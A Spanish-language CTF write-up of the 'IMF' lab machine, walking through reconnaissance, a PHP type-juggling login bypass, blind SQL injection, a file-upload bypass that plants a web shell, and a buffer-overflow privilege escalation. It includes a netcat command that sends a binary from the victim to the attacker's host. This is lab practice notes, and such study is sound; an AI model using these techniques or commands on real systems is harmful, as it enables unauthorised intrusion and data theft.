# IMF

Tags: [[_infoLeakage]],[[_sqli]],[[_scripting]],[[_bypassing]],[[_webExploitation]],[[_analysis]],[[_bof]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
NO funciona el ICMP sobre la máquina.
Juguemos con tcping (Windows-Linux). Clonamos el repo, entramos.

<span style="color:#88c425">go build -ldflags "-s -w" .</span>
<span style="color:#ecacb6">-s -w</span> es para reducir el peso.
Nos crea tcping
<span style="color:#88c425">upx tcping</span> :    para reducir el peso.
Ya podemos hacer
<span style="color:#88c425">./tcping 192.168.0.17</span> 


Posible máquina Linux (Aunque no se determina bien).
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Xenial.

Puertos abiertos.

80 - HTTP Apache.

## Investigación (Intrusión)
(Reconocimiento/Enumeración).

80.
http-server-header: Apache/2.4.18 (Ubuntu).

whatweb. 
Modernizr 2.6.2.min. No lo había visto, de ahí en más nada.

Wappalizer reporta poco.

Desde la web.
Se ve un título, investigando me lleva a una web donde hay nombres de usuario, en caso de necesitarlos, los escrbiré.

Hay un lugar para contactar, mandando Email, full name, comments.
Hay usuarios y tienen correo con el dominio "imf.local", voy a contemplarlo en el /etc/hosts

Pero igual sigo enumerando y probando en donde estoy.
En el código fuente se ve la flag1. YWxsdGhlZmlsZXM= :    allthefiles

Parece que se envían los datos, pero no creo que haga algo.

Desde la web (imf.local)
Es la misma que la IP sola.

Fuzeemos URI´s.
No hay muchas.

Pensando en la flag1, veo que unos archivos tienen nombre como base64, lo junto y me dan la flag2: imfadministrator

Es una ruta, /imfadministrator
Pide username y password.
Código fuente: se Hardcodeo la contraseña dicen.

En la petición viaja nuestra cookie.
Hay que hacer pruebas y ver si los usuarios de la web son válidos, y el usuario "rmichaels" es válido.

Desde BurpSuite vamos a fuzzear el campo de password para encontrarla (Brute Force).
No va bien, así que en Python.
(Haciendo el script... (aunque es probable que no sea esa la aproximación, porque va lento)).

Si no dan las pruebas, podemos fuzzear dentro del directorio. No hay nada.

Debemos burlar el pannel de alguna manera.
Recordemos que hay una comparativa porque la contraseña está hardcodeada como decían.
Podemos probar por tipos de datos.

No ponemos <span style="color:#ecacb6">test[]</span> como password, si no que el parámetro <span style="color:#ecacb6">pass</span> lo ponemos como <span style="color:#ecacb6">pass[]</span>
Para que sea <span style="color:#ecacb6">pass[]=test</span>
Y al aplicar mal la comparativa, sin usar triple igual, pues se pueda burlar.

Esto se llama Type Junggling. Es como en php.

Obtenemos la flag3: Y29udGludWVUT2Ntcw== : continueTOcms

Hay un enlace en la web a la que entramos.
Y en la URL vemos que hay un parámetro cms.php?, hay que probarlo.

Posible LFI.
Pero vemos que no hay mucho.

Posible RFI.
Pero vemos que no hay mucho.

SQLI.
Sí se ocasiona el error, así que a darle.
Es a ciegas, hicimos un script y enumeramos toodo. (El script lo tengo guardado, pero igual se puede volver a hacer sin problemas).

No hubo credenciales o algo, si no que reportó rutas donde podemos apuntar, veamos todo:
<span style="color:#ecacb6">information_schema,admin,mysql,performance_schema,sys</span>
<span style="color:#ecacb6">DB admin tables: pages</span>

<span style="color:#ecacb6">DB admin columns tables pages: </span>id,pagename,pagedata
<span style="color:#ff2dc0">id :    admin</span>
<span style="color:#ff2dc0">pagename :    disavowlist,home,tutorials-incomplete,upload</span>
<span style="color:#ff2dc0">pagedata :    underconstruction,welcometotheimfadministra,trainingclassroomsavailable,hdisavowedlisthimgs</span>

Hay uno donde hay un QR, lo escaneamos en la web. Le sacamos captura.

Buscamos
qr online imagen

Sacamos una captura.
Vemos la cuarta flag, es el nombre de un archivo.php -> <span style="color:#ecacb6">uploadr942.php
</span>
Si entramos a 
<span style="color:#ecacb6">http://imf.local/imfadministrator/uploadr942.php</span>
Vemos una subida de archivos.

Aprovechamos la subida de archivos.
Uy, a parte de detectar la extensión, aplica algo y se ve que detecta que hay una función "exec" de PHP.
He de suponer que lo detecta también si hay shellexec, etc.

Podemos no usar ese tipo de funciones.
De primeras podría rular, pero no tendría sentido subirlo como imagen, interceptemos con BurpSuite para ver qué tipo de extensión PHP soporta. Y también extensiones de imágenes.
Es probar también a cambiar el conten-type al de imágenes.

También en la misma petición podemos poner los magic numbers, GIF8; PNG; etc.

Vemos cositas cuando son imágenes, lo mismo que veíamos en la web cuando subíamos una imagen con código php. Así que podemos determinar que funciones de ejecución no pueden haber.
Las imágenes nos ponen que la data es inválida, así que le pongo GIF8; y pa deentro.
Vemos la respuesta y hay como identificadores, supongo que los nombres de los archivos.

Dependiendo de la extensión que se probó, esa le añadimos, vemos cuál se puede llegar a interpretar, en este caso .gif, usamos el parámetro y pa deeeentro.

<span style="color:#ecacb6">http://imf.local/imfadministrator/uploads/373b1d428080.gif?cmd=id</span>
Así quedó.
Ganamos acceso al sistema.


## Escalada

Enumerar todo el sistema.
Efectivamente, Ubuntu Xenial.

Podemos ver la flag 5: <span style="color:#07b4f2">flag5{YWdlbnRzZXJ2aWNlcw==}</span>
<span style="color:#ecacb6">agentservices</span>

Hay unos archivos en /boot interesantes.
Veo una password cifrada. Pero no se crackea.

Pueden haber puertos que se abren hacia afuera, pero internamente pueden haber otros, esto porque "agentservices" me suena a algo de servicios.

Con netsat -nat :    veo un puerto, y me conecto
nc localhost 7788

Nos pide un ID.
Así que busquemos el binario para ver su comportamiento.
Vemos el path y nos vamos a las rutas para filtrar y encontrar el binario.

Está como <span style="color:#ecacb6">/usr/local/bin/agent</span>
<span style="color:#88c425">./agent</span> :    lo ejecuto y es <span style="color:#07b4f2">el mismo</span>.
Con <span style="color:#ff2dc0">ltrace</span> puedo ver con qué cadena se está comparando, y sí, ese es el ID.

Una opción nos hace algo, pero muestra nuestra cadena por pantalla.
Podemos intentar ocasionar un Buffer Overflow.
Y sí, se ocasiona un Segmentation fault en un apartado del programa.

Nos lo transferimos.
Vamos a la ruta del binario.

En máquina atacante
<span style="color:#88c425">nc -nlvp 443 > agent</span> 

Máquina víctima
<span style="color:#88c425">nc 192.168.0.13 443</span> < <span style="color:#88c425">agent </span>

Y a empezar la metralla.
El binario se corre como servicio.
BOF. 
Aplicamos un [[ret2reg]].
Estas son las notas que fui tomando:
![[Pasted image 20240721145708.png]]

Este es el script que hice (en máquina víctima):
![[Pasted image 20240721145739.png]]

Solo queda ponerse en escucha y pa deeeeentro (Obtenemos la 6ta flag).
